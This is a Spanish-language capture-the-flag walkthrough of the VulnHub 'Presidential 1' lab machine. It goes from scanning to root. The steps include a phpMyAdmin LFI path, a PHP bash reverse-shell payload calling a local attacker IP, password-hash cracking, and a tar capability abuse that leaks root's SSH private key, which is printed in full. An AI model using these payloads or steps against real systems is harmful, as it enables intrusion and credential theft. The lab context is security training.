
---
- Tags: #Presidential
---

- **Máquina Presidential 1**: [https://www.vulnhub.com/entry/presidential-1,500/](https://www.vulnhub.com/entry/presidential-1,500/)

## Reconocimiento:

Hacemos un *arp-scan* para descubrir la IP de la máquina, lanzamos un PING a la misma y podemos ver que el ttl es 64 lo que nos indica que es una máquina linux. *192.168.18.239*

Le aplicamos un *nmap* a la ip para descubrir los puertos abiertos, un modo escaneo silencioso, con un min-rate de 5000, con triple verbose y sin resolución DNS ni Host Discovery
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.239 -oG allPorts
```
Le lanzamos un conjunto de scripts básicos de reconocimiento a los puertos que están abiertos y lo exportamos todo en formato nmap a un archivo *targeted*.
```bash
nmap -sCV -p80,2082 192.168.18.239 -oN targeted
```

 Al hacer un whatweb a la dirección IP de la máquina víctima podemos ver un posible dominio llamado *votenow.local* por si hay virtual hosting, asi que nos abrimos el *etc/hosts* y añadimos ese dominio.

Le lanzamos un nmap con los scripts al puerto 80 de la máquina víctima.
```bash
nmap --script http-enum -p80 192.168.18.239
```
Nos reporta un directorio */icons* pero sin mas. Asi que le aplicamos un gobuster para descubrir mas cosas.
```bash
gobuster dir -u http://192.168.18.239/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20 --add-slash
```
Y encontramos el directorio */assets y un /cgi-bin* pero sin mas, asi que buscamos por subdominios.
```bash
gobuster vhost -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 --append-domain | grep -v "400"
```
Con el último comando llegamos a descubrir un *datasafe.votenow.local* que añadimos al */etc/hosts* y nos metemos para ver un login de *phpMyAdmin*. Pero no disponemos de credenciales aún. Asi que nos ponemos a buscar de forma mas profunda. Buscamos archivos que acaben con extensión *php* entre otras y encontramos un config.php pero completamente vacío asi que buscamos *php.bak* para ver algún archivo de backup o guardado.
```bash
gobuster dir -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 -x php,txt,php.bak,bak,tar
```
Y por fin encontramos un *config.php.bak* con la contraseña, usuario, host y name en texto claro.
```php
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```

Con estas credenciales nos metemos al phpMyAdmin, para ver la versión, resulta estar utilizando una version *4.8.1* vulnerable a un LFI y RCE según searchsploit, nos metemos al RCE y miramos un poco lo que hace, para ejecutarlo nosotros.
```python
/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```
Con la siguiente linea tenemos un LFI y podemos apuntar a otros archivos. Intentamos listar los logs de apache o ssh pero no existen. El /proc/net/tcp si podemos listarlo. Lo guardamos en un archivo data. 
```bash
 0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18606 1 ffff8b7936e007c0 100 0 0 10 0                     
   1: 00000000:0822 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18508 1 ffff8b7936e00000 100 0 0 10 0                     
   2: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000    27        0 18988 1 ffff8b7936e00f80 100 0 0 10 0                     
   3: EF12A8C0:0050 E212A8C0:A414 06 00000000:00000000 03:0000159A 00000000     0        0 0 3 ffff8b78aa62ab00                                      
   4: EF12A8C0:0050 E212A8C0:AD9E 01 00000000:00000000 02:000B049F 00000000    48        0 376734 2 ffff8b7938055540 102 4 28 10 18                  
   5: EF12A8C0:0050 E212A8C0:CA5C 06 00000000:00000000 03:000015C0 00000000     0        0 0 3 ffff8b78aa62a900
```

Con este comando verémos que puertos estan abiertos, los puertos 80, 2082 e internamente también esta abierto el *3306*. Correspondiente a mysql, que podemos enumerar con un */proc/sched_debug*.
```bash
for port in $(cat data | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "[+] Port $port -> $((0x$port))"; done
```

Identificador de sesión: viadnld0oeopbg5nl7i0inil09er2fsk
```url
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_viadnld0oeopbg5nl7i0inil09er2fsk
```
Aqui podemos ver como derivar el LFI al RCE, si tu hacer una query en la url de arriba podemos ver la misma, y como estamos en un recurso php, la web nos lo interpreta.
```php
select '<?php system("bash -i >& /dev/tcp/192.168.18.226/443 0>&1"); ?>';
```
La página se queda cargando, con lo cuál ya no podemos acceder al phpMyAdmin y aún tenemos posibles contraseñas alli. Lo que vamos a hacer es ponernos en escucha otra vez y desde la reverse shell vamos a entablarnos otra reverse shell pero en segundo plano. Hacemos un tratamiento de la tty.
```bash
script /dev/null -c bash
#ctrl + z
stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```
Dentro de phpMyAdmin en votebox/ users podemos encontrar un usuario y un hash.
```bash
admin:$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
```
Vamos a crackearlo. (Para encontrar el rockyou.txt, he tenido que usar sudo find / -name "rockyou.txt*" 2>/dev/null porque no me acordaba la ruta.)
```bash
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```
El comando de john tarda un poco (mucho) en crackearlo. El resultado es: *Stella* y con esta contraseña podemos hacer un su a *admin* y entrar en el directorio. 

### Escalada de privilegios
Para escalar privilegios, buscamos archivos con SUID, pero no encontramos nada interesante. Pasamos e ver la capabilities.
```bash
find / -perm -4000 2>/dev/null

getcap -r / 2>/dev/null
```
Encontramos una capability que nos deja crear un comprimido que no podemos ver, luego descomprimirlo y verlo. */usr/bin/tarS*
Asi que vamos a comprimir la clave de root:
```bash
tarS -cvf id_rsa.tar /root/.ssh/id_rsa
tar -xf id_rsa.tar
cd root/
cd .ssh/
cat id_rsa
```
La clave privada:
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAqCxgVFD0v4dmf8XgX5fKVeZ7V5LcY8hdKTDebvjCtrASgFnQ
hr86LOOdQ1kBaAsrayIZeZu5zd4Vr5CAHrR5OBosvkaURNhxxXyO/Gxf0e5zFDkg
lZD4VKzTcHg0aENL8aIaUAka38PVgFjgrJjuh5wUgjavKA7wXGllRTvrEKMBCVs5
QE4bbaENShTFLd5RBxkhH+Ph9PKgO8+8nkjtn4Rnz1dtqUlvoSO7CdSlQUeMdE8f
p8mkn9IRENfqHL2bIsZvdi4Uz90aeZKBztS7SnxHhiW7V8OKOnoK1iYSokNRJmcZ
wGA1pkW9HJF3PHjNEJnaDRsoHcRwgp/aDr+0l2SgrCj9hahF/xm0fZzTMDcs3Bjs
iiHXkksH/lO/4yJO4kOCiEaj9izpDWiefMLTSh1GjqZoVVpI9fu/JJnTf/oJV3em
6R5TDafIIDga/jxhDEnIaL/LQkw/7DXNB9GwEJQ6LfnPmIhR30V+zSw1YIot6PY9
zh9347jSDVqrr6Sm38fDZ3UdmWmi3/e4zrJOJGn//2NLCgNc8z1/CcRe2yr8uosf
wBgM04HN52PGN3IFzpVYpwYEHwUhb/9S8ZuMvIKxX5ycrmt/r2WlgYYH2gEWk0Y5
BbAyjULgV2XWSBDlplaaL0YRe6++XCGax5MopdUjoon9+Pm4d/uoOdO6/vECAwEA
AQKCAgBTJB07kgpt5fK2mI0ktVZCwX+Y+/IZIqVsB8zv7+vThZif+8cr1r5cEutc
sFQRq/P7MxCFHoftTy5JbZbply+WnNoh96K1powYpkvKX4m/r7MU/GkviEw9EHQ3
1jWSljKlcw6vItE2bwrOOSJaMgE66d75wS83DqumBDUc1VKRFwUcKw1SzUqiGE0J
otsYoiBM8g9+RJshDhJJf5owZr2Tb1IjH4YHe1bEw3VklsxcSZMWrUdpHDdXC/OD
8Dq9mr9nodLZCk8ftJ+yGswyBNnTKT3zBBRqfzGHV26kEI6FyeIEqlQA14+udCva
Q9A/BTncSzOR5yseDE/TRFP5lq0gnmXy1LUL01CDYHIzD60+i0ZWl4fsd/UmYWfK
1Hj098XstE6y9sMX+a41y4BVUn3Mys6bKQ23y8QPzODQSrLPCdCmy7+KyuE4w2wV
XRiofto/1CsbSkKy38apAGc440siNh4V5zXnF1tGvQl+6KuQcZFDXLAcG7QZ3XIw
lCWPU0Zx1Og7hmQACfiMuM6szSxA34bZjd1AnaXq6yn1r3Mq9RAvYMHB64z6xvOD
KO14Bq/XgQ3pEf0+qdAMc89Lq5N4BFna++K63+Ol6LJ8xxv9quU0Db2rO9hMC+fJ
q3c/BsCm0qByAV69jTd6YBmRYA/qnOZrB7Mc5KGTffnynDK/AQKCAQEAz8DYOLY3
dZQ/3Nusy5S+JiZhdgsktbQjn+Ty2fGuYX5nxZ6zUHP0P6a6KjCo6s7m4PS1DHHW
J/Ml42LD9ofW/2A5kk7Qfxec9HCwFuE6+5T4GcAXknOhtwvYupsyY/2rsnO6313d
gpazELlJpwZr2iLl2I8cXAIorBkiVD0vGJmGS/6ld0Yn68JAeZyUw8Ec9h0axKJ8
h+TBvEKjeKnr66Lka416iTVCpmvx01NRe/1duq9vc4ukD8kLsqROtpKeBuhJXV+z
uvqzQVnMOHCZdH2w8Oe7QOfQSQvzccxRvQMstusEyhI7c+yp8En+XNHDX7MPp8NH
EQmE6bQklqHZLQKCAQEAzzp2DQo9kiuQE1ZSorgTT5CDwVv94rUUu3WgbYNKfdot
a9knuTSRkKvDbYkAUj2I95Vv+vusYUUIuUnQ7x92cBtlOZ2zqBzxvQme1SL2hSso
LKi/f8irTxdvld4SBuLE83i7oFsdZgtWfbbBMitYE4WZsrQv9qiB5U9/5cRQT7RP
R7sFIZ9DHJfAmpdQmAIb901ESEKLPz34/JVEFopgE0TQzmaiwCeKICsjvE++/a6y
dXt/4pIja47URuaEmB7g+1QHCALF00vsfp6YqAnALcJ8CVNeddZ+/zxDcAypGdxM
uAacoIbICllpMEXm+KLnqsfd/e4MXUEnKJpR/31PVQKCAQEAzp5RrN10fMjLVwFX
ckVlc5W6WmcsxFX7FDvkV2No9ed8l2uFlN8trNxJzEoGxTivIE3ffhf9UFAff20r
zhU9e1CdEWi3LZ8zZ1xnlOm9+pYmxZ1pFCtSSzVKABT34cBZMaqt0RaOhiEQx/Iv
USEuxIzuoRl7r/oprzd0D+ml3EZb7Vq9/8jTTUMtUoWq4qE+B3vcsnGTfqfBElYI
NKpySzD/EgRsOOeyeMdkg7MamEDdJhzysCzSJyzhKHMHIcbhyabdyDK1EqHhA36m
f/9kbxnOj1k4v42Ndgifvq7hICV3JBjK85l8bYeTX7qHcpLgR15TlJq/JC+ec7vI
o9MlpQKCAQAozkE6th6DrvJS7HefNRIQY8ueAqhOwQuREkuB5Q2BFLpG917cGF7l
lv0Hj6exig5zekivqmk6Sia6na93tsFSuAJJwyUCYJi1ebR+EcFrXaEukhgLaI9b
JqlBYJY6JuNTch24KNj0JB1m6drHL0PLrE4ko1iigHH7npj3vJ135HCMFmafRUYo
1jUF++/RzvCE1QEyHXBgBqsFybq7mYnroWxgiFNZ9S88wGHsDeP0/jaD7cqz6cTx
xBFG2NOZRNNWiihMSod74QJzuHUk+a6PFDHqgDEkkRU22z4ITWXrArdUsXCcJ44y
g4K0D7+4jBOETJEJFJv4rQCx/RlSbvF1AoIBAQCBpyqo2wEXzPvKLjqE4Ph7Cxy7
Z1nlGMp/mFRA5dOXH6CsZWELepVrhh6vlNa93Rq9yg7PLZH8pSv4E5CMmj6eBqLr
ZDcekqPPB31M7UNe8rS0xaBEVApAy0Dx0OiTDcqre+3g2ikIUx3ysStZmt01gTHp
0EgcDlzsmng+qPys8I7VtpUh/XDAKz5m/8b7mEQRQCmduKE7+yqGLKRwdJfq4cJ5
YPChhiv43zowPpuha/akN7Ydl+qi7toMQhvnayX5S2Vb9kl4Fl7JBV5KV16h4Lbw
SeSIdV0ITWhpxuG+K10LN69mYuTAZm6ihc0MM3v4nRtE3UpV74FCkQsTIfKC
-----END RSA PRIVATE KEY-----
```

Nos conectamos por ssh, en el puerto 2082, **RECUERDA ESCRIBIR EL YES.**
```bash
ssh -i id_rsa root@localhost -p 2082
```
![[Pasted image 20260924204735.png]]